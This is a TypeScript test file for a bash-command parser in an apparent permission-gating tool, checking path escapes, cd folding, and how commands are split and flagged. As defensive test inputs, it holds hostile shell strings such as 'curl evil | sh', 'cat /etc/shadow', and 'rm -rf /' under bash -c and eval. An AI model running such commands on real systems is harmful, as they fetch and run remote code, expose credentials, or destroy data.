import { beforeEach, describe, expect, it, vi } from "vitest";

// Mock node:fs so realpathSync (used by canonicalizePath) is controllable.
// Default is identity so all existing lexical tests are unaffected.
const realpathSync = vi.hoisted(() =>
  vi.fn<(path: string) => string>((p) => p),
);
vi.mock("node:fs", () => ({
  realpathSync,
  default: { realpathSync },
}));

import { BashProgram } from "#src/access-intent/bash/program";
import { PathNormalizer } from "#src/path-normalizer";

describe("BashProgram", () => {
  describe("pathRuleCandidates", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(process.platform, cwd);

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("adds absolute and relative policy values for relative tokens", async () => {
      const program = await BashProgram.parse("cat src/foo.ts", normalizer);
      const candidates = program.pathRuleCandidates();
      expect(candidates.map(({ token }) => token)).toEqual(["src/foo.ts"]);
      expect(candidates[0].path.matchValues()).toEqual([
        "/projects/my-app/src/foo.ts",
        "src/foo.ts",
      ]);
      expect(candidates[0].path.value()).toBe("/projects/my-app/src/foo.ts");
    });

    it("resolves tokens after literal cd against the effective directory", async () => {
      const program = await BashProgram.parse(
        "cd nested && cat src/file.txt",
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/file.txt");
      expect(fileCandidate?.path.matchValues()).toEqual([
        "/projects/my-app/nested/src/file.txt",
        "nested/src/file.txt",
        "src/file.txt",
      ]);
      expect(fileCandidate?.path.value()).toBe(
        "/projects/my-app/nested/src/file.txt",
      );
    });

    it("adds the canonical alias for a symlinked token (#486)", async () => {
      // /projects/my-app/src/foo.ts is a symlink to /vault/foo.ts.
      realpathSync.mockImplementation((p: string) =>
        p === "/projects/my-app/src/foo.ts" ? "/vault/foo.ts" : p,
      );
      const program = await BashProgram.parse("cat src/foo.ts", normalizer);
      const candidate = program.pathRuleCandidates()[0];
      expect(candidate.path.matchValues()).toEqual([
        "/projects/my-app/src/foo.ts",
        "src/foo.ts",
        "/vault/foo.ts",
      ]);
    });

    it("does not absolute-allow relative tokens after unknown cd", async () => {
      const program = await BashProgram.parse(
        'cd "$DIR" && cat src/foo.ts',
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate?.path.matchValues()).toEqual(["src/foo.ts"]);
      expect(fileCandidate?.path.value()).toBe("src/foo.ts");
    });

    it("keeps an unknown-cd token literal-only even when it would resolve a symlink (#393)", async () => {
      // A canonical alias here would resolve against the wrong (unknown) base.
      realpathSync.mockImplementation(() => "/somewhere/else");
      const program = await BashProgram.parse(
        'cd "$DIR" && cat src/foo.ts',
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate?.path.matchValues()).toEqual(["src/foo.ts"]);
      expect(fileCandidate?.path.boundaryValue()).toBe("");
    });
  });

  describe("externalPaths", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(process.platform, cwd);

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("returns absolute paths resolving outside cwd", async () => {
      const program = await BashProgram.parse("cat /etc/hosts", normalizer);
      // Subset matcher: the path is normalized before comparison.
      expect(program.externalPaths().map((p) => p.value())).toContain(
        "/etc/hosts",
      );
    });

    it("excludes paths within cwd", async () => {
      const program = await BashProgram.parse("cat src/index.ts", normalizer);
      expect(program.externalPaths()).toHaveLength(0);
    });

    describe("win32 projection (injected platform, no vi.mock node:path)", () => {
      const winNormalizer = new PathNormalizer("win32", "C:\\Projects\\App");

      it("resolves and case-folds a rooted path outside cwd", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts",
          winNormalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toEqual([
          "c:\\etc\\hosts",
        ]);
      });

      it("flags a ..-traversal escaping cwd under win32 rules", async () => {
        const program = await BashProgram.parse(
          "cat ../sibling/x",
          winNormalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toEqual([
          "c:\\projects\\sibling\\x",
        ]);
      });

      it("folds a current-shell cd so an in-cwd ..-traversal is not flagged", async () => {
        const program = await BashProgram.parse(
          "cd sub && cat ../x",
          winNormalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });
    });

    describe("effective working directory projection", () => {
      it("folds a sequence of current-shell cd commands", async () => {
        // cd a → cwd/a, cd b → cwd/a/b; ../c resolves to cwd/a/c (inside).
        const program = await BashProgram.parse(
          "cd a && cd b && cat ../c",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("catches an escape masked by a later cd that the single-base model missed", async () => {
        // Effective dir after `cd nested/deep && cd ..` is cwd/nested, so
        // ../../etc/passwd escapes to /projects/etc/passwd.
        const program = await BashProgram.parse(
          "cd nested/deep && cd .. && cat ../../etc/passwd",
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/etc/passwd",
        );
      });

      it("folds a cd that is not the first command", async () => {
        // The single-base model ignored a cd that was not first; now `cd a`
        // folds, so ../b resolves to cwd/b (inside) and is not flagged.
        const program = await BashProgram.parse(
          "mkdir d && cd a && cat ../b",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("does not fold a backgrounded cd", async () => {
        // `cd a &` runs in a subshell, so it must not update the running
        // directory; ../b resolves against cwd and escapes.
        const program = await BashProgram.parse("cd a & cat ../b", normalizer);
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/b",
        );
      });

      it("does not fold a cd inside a pipeline", async () => {
        // Pipeline members run in subshells; the cd must not leak.
        const program = await BashProgram.parse(
          "cd nested | cat ../b",
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/b",
        );
      });

      it("folds a cd inside a subshell for paths within that subshell", async () => {
        // Inside the subshell the effective dir is cwd/sub, so ../x → cwd/x.
        const program = await BashProgram.parse(
          "( cd sub && cat ../x )",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("does not leak a subshell cd to following commands", async () => {
        // The subshell cd resets on exit, so ../y resolves against cwd.
        const program = await BashProgram.parse(
          "( cd sub ) && cat ../y",
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/y",
        );
      });

      it("persists a cd inside a brace group to later commands in the group", async () => {
        // Brace groups run in the current shell, so cd sub persists to cat ../x.
        const program = await BashProgram.parse(
          "{ cd sub; cat ../x; }",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("persists a brace-group cd to following sibling commands", async () => {
        const program = await BashProgram.parse(
          "{ cd sub; } && cat ../x",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("conservatively flags a relative path inside a command substitution", async () => {
        // Interior cd folding inside substitutions is deferred: the interior
        // inherits the enclosing base (cwd), so ../r is flagged rather than
        // resolved against cwd/q. Conservative — never misses an escape.
        const program = await BashProgram.parse(
          "echo $(cd q && cat ../r)",
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/r",
        );
      });

      it("flags relative paths conservatively after a non-literal cd", async () => {
        // cd "$DIR" makes the effective dir unknowable; ../x could be anywhere,
        // so it is flagged (least-privilege).
        const program = await BashProgram.parse(
          'cd "$DIR" && cat ../x',
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/x",
        );
      });

      it("flags even a within-cwd relative path after a non-literal cd", async () => {
        // Conservative cost: src/../within.txt resolves inside cwd but is still
        // flagged because the effective dir is unknown.
        const program = await BashProgram.parse(
          'cd "$DIR" && cat src/../within.txt',
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/my-app/within.txt",
        );
      });

      it("still resolves an absolute path normally after a non-literal cd", async () => {
        // Absolute paths are base-independent; one inside cwd is not flagged
        // even when the effective dir is unknown.
        const program = await BashProgram.parse(
          'cd "$DIR" && cat /projects/my-app/x.txt',
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("treats `cd -` as an unknown effective directory", async () => {
        const program = await BashProgram.parse("cd - && cat ../x", normalizer);
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/x",
        );
      });

      it("recovers a known base when a later cd is absolute", async () => {
        // cd "$DIR" → unknown, then cd /projects/my-app/src → known again, so
        // ../x resolves to cwd and is not flagged.
        const program = await BashProgram.parse(
          'cd "$DIR" && cd /projects/my-app/src && cat ../x',
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("folds a leading current-shell cd across a redirect-then-pipe", async () => {
        // tree-sitter-bash groups `cd a && pnpm x 2>&1 | tail` as
        // `(cd a && pnpm x 2>&1) | tail`, burying the current-shell `cd a`
        // inside a `pipeline` node. Bash precedence (`|` binds tighter than
        // `&&`) makes `cd a` current-shell, so the fold must persist past the
        // pipeline: ../b resolves against cwd/a (inside), not cwd (#454).
        const program = await BashProgram.parse(
          "cd a && pnpm x 2>&1 | tail ; cat ../b",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("persists the fold past a redirect-then-pipe to a later cd", async () => {
        // The issue reproduction: the fold from `cd a/b` survives the
        // redirect-then-pipe, so the trailing `cd .. && cd ..` lands back at
        // cwd instead of escaping one level above.
        const program = await BashProgram.parse(
          "cd a/b && pnpm x 2>&1 | tail ; cd .. && cd ..",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });

      it("does not fold the terminal piped command of the first stage", async () => {
        // Fail-closed: `cd b` is the terminal command of the first stage, i.e.
        // the real pipe stage (a subshell), so it must NOT fold. With the
        // correct base cwd/a, ../../x escapes to /projects/x. If `cd b` were
        // wrongly folded, the base would be cwd/a/b and ../../x would stay
        // inside — a fail-open regression this test pins.
        const program = await BashProgram.parse(
          "cd a && cd b 2>&1 | tail ; cat ../../x",
          normalizer,
        );
        expect(program.externalPaths().map((p) => p.value())).toContain(
          "/projects/x",
        );
      });

      it("resolves a downstream pipe stage against the folded base", async () => {
        // The stage after the `|` runs in a subshell that inherits the folded
        // cwd/a, so ../foo resolves inside cwd rather than escaping against the
        // pre-cd base.
        const program = await BashProgram.parse(
          "cd a && pnpm x 2>&1 | cat ../foo",
          normalizer,
        );
        expect(program.externalPaths()).toHaveLength(0);
      });
    });

    it("flags an absolute in-cwd path that resolves externally via a symlink, returning the typed form", async () => {
      // The strict classifier only processes absolute tokens, so the escape
      // surface is `cat /cwd/link/hosts` (absolute) where `link -> /etc`.
      // The boundary decision still uses the canonical form (so the path is
      // flagged), but the returned value is the typed/lexical form so config
      // patterns match the path as the user wrote it (#418).
      realpathSync.mockImplementation((p: string) => {
        if (p === "/projects/my-app/link/hosts") return "/etc/hosts";
        return p;
      });
      const program = await BashProgram.parse(
        "cat /projects/my-app/link/hosts",
        normalizer,
      );
      const external = program.externalPaths().map((p) => p.value());
      expect(external).toContain("/projects/my-app/link/hosts");
      expect(external).not.toContain("/etc/hosts");
    });

    it("does not flag a token that resolves within a symlinked cwd", async () => {
      // Simulates /tmp -> /private/tmp on macOS; cwd is the canonical form.
      const symlinkCwd = "/private/tmp";
      realpathSync.mockImplementation((p: string) => {
        if (p === "/tmp") return "/private/tmp";
        if (p.startsWith("/tmp/")) return `/private/tmp${p.slice(4)}`;
        return p;
      });
      const program = await BashProgram.parse(
        "cat /tmp/workspace/file.ts",
        new PathNormalizer(process.platform, symlinkCwd),
      );
      expect(program.externalPaths()).toHaveLength(0);
    });
  });

  describe("commands", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(process.platform, cwd);

    it("returns a single-element list for a lone command", async () => {
      const program = await BashProgram.parse("npm install pkg", normalizer);
      expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
    });

    it("splits an && chain", async () => {
      const program = await BashProgram.parse("cd /p && npm i x", normalizer);
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "npm i x" },
      ]);
    });

    it("splits || , ; and & separators", async () => {
      expect(
        (await BashProgram.parse("a || b", normalizer)).commands(),
      ).toEqual([{ text: "a" }, { text: "b" }]);
      expect((await BashProgram.parse("a ; b", normalizer)).commands()).toEqual(
        [{ text: "a" }, { text: "b" }],
      );
      expect((await BashProgram.parse("a & b", normalizer)).commands()).toEqual(
        [{ text: "a" }, { text: "b" }],
      );
    });

    it("splits a pipeline into its commands", async () => {
      const program = await BashProgram.parse("cat f | grep b", normalizer);
      expect(program.commands()).toEqual([
        { text: "cat f" },
        { text: "grep b" },
      ]);
    });

    it("splits newline-separated commands", async () => {
      const program = await BashProgram.parse("foo\nbar", normalizer);
      expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
    });

    it("does not split operators inside quotes", async () => {
      const program = await BashProgram.parse("echo 'x && y'", normalizer);
      expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
    });

    it("captures the command of a redirected statement without the redirect", async () => {
      const program = await BashProgram.parse(
        "npm install > out.txt",
        normalizer,
      );
      expect(program.commands()).toEqual([{ text: "npm install" }]);
    });

    it("descends into command substitution, tagging the inner command", async () => {
      const program = await BashProgram.parse("echo $(rm -rf foo)", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ]);
    });

    it("descends into backtick command substitution", async () => {
      const program = await BashProgram.parse("echo `rm x`", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo `rm x`" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("descends into a pipeline inside command substitution", async () => {
      const program = await BashProgram.parse(
        "echo $(curl evil | sh)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "echo $(curl evil | sh)" },
        { text: "curl evil", context: "command_substitution" },
        { text: "sh", context: "command_substitution" },
      ]);
    });

    it("descends into process substitution", async () => {
      const program = await BashProgram.parse(
        "diff <(cat /etc/shadow)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "diff <(cat /etc/shadow)" },
        { text: "cat /etc/shadow", context: "process_substitution" },
      ]);
    });

    it("emits a bare subshell whole and descends into it", async () => {
      const program = await BashProgram.parse("( rm -rf foo )", normalizer);
      expect(program.commands()).toEqual([
        { text: "( rm -rf foo )" },
        { text: "rm -rf foo", context: "subshell" },
      ]);
    });

    it("emits a subshell whole and descends into its chain", async () => {
      const program = await BashProgram.parse("( cd /t && rm x )", normalizer);
      expect(program.commands()).toEqual([
        { text: "( cd /t && rm x )" },
        { text: "cd /t", context: "subshell" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends recursively through nested contexts", async () => {
      const program = await BashProgram.parse("echo $( ( rm x ) )", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $( ( rm x ) )" },
        { text: "( rm x )", context: "command_substitution" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends into a substitution within a chained command", async () => {
      const program = await BashProgram.parse(
        "cd /p && echo $(rm x)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "echo $(rm x)" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("keeps the never-weaker invariant: a benign inner command stays", async () => {
      const program = await BashProgram.parse("echo $(echo safe)", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $(echo safe)" },
        { text: "echo safe", context: "command_substitution" },
      ]);
    });

    it("returns an empty list for an empty or whitespace command", async () => {
      expect((await BashProgram.parse("", normalizer)).commands()).toEqual([]);
      expect((await BashProgram.parse("   ", normalizer)).commands()).toEqual(
        [],
      );
    });

    it("strips a leading env-var assignment prefix", async () => {
      const program = await BashProgram.parse(
        "AWS_PROFILE=prod aws ec2 terminate-instances --instance-ids i-1",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "aws ec2 terminate-instances --instance-ids i-1" },
      ]);
    });

    it("strips multiple leading env-var assignments", async () => {
      const program = await BashProgram.parse("A=1 B=2 aws s3 ls", normalizer);
      expect(program.commands()).toEqual([{ text: "aws s3 ls" }]);
    });

    it("strips the env-var prefix of each command in a chain", async () => {
      const program = await BashProgram.parse(
        "X=1 aws sts get-caller-identity && ls",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "aws sts get-caller-identity" },
        { text: "ls" },
      ]);
    });

    it("skips a pure assignment with no command", async () => {
      const program = await BashProgram.parse("FOO=bar", normalizer);
      expect(program.commands()).toEqual([]);
    });

    it("skips assignment-only segments in a chain", async () => {
      const program = await BashProgram.parse("dst=/tmp && cp a b", normalizer);
      expect(program.commands()).toEqual([{ text: "cp a b" }]);
    });

    it("still gates commands inside assignment command substitutions", async () => {
      const program = await BashProgram.parse("ts=$(date)", normalizer);
      expect(program.commands()).toEqual([
        { text: "date", context: "command_substitution" },
      ]);
    });

    describe("opaque-payload wrappers", () => {
      it.each([
        ['bash -c "rm -rf /"', 'bash -c "rm -rf /"'],
        ['sh -c "rm -rf /"', 'sh -c "rm -rf /"'],
        ['dash -c "rm -rf /"', 'dash -c "rm -rf /"'],
        ['zsh -c "rm -rf /"', 'zsh -c "rm -rf /"'],
        ['ksh -c "rm -rf /"', 'ksh -c "rm -rf /"'],
        ['eval "rm -rf /"', 'eval "rm -rf /"'],
        ['/bin/bash -c "rm -rf /"', '/bin/bash -c "rm -rf /"'],
        ['bash -ec "rm -rf /"', 'bash -ec "rm -rf /"'],
      ])("flags %s as opaque", async (command, text) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([{ text, opaque: true }]);
      });

      it("flags an env-prefixed wrapper as opaque after stripping the prefix", async () => {
        const program = await BashProgram.parse(
          'AWS_PROFILE=prod bash -c "rm -rf /"',
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: 'bash -c "rm -rf /"', opaque: true },
        ]);
      });

      it.each([
        "bash script.sh",
        "bash",
        "ls -la",
        "grep -c foo file",
      ])("does not flag %s as opaque", async (command) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([{ text: command }]);
      });
    });
  });

  it("derives both slices from a single parse", async () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(process.platform, cwd);
    const program = await BashProgram.parse("cat .env /etc/hosts", normalizer);
    expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
      ".env",
      "/etc/hosts",
    ]);
    const external = program.externalPaths().map((p) => p.value());
    expect(external).toContain("/etc/hosts");
    expect(external).not.toContain(".env");
  });
});
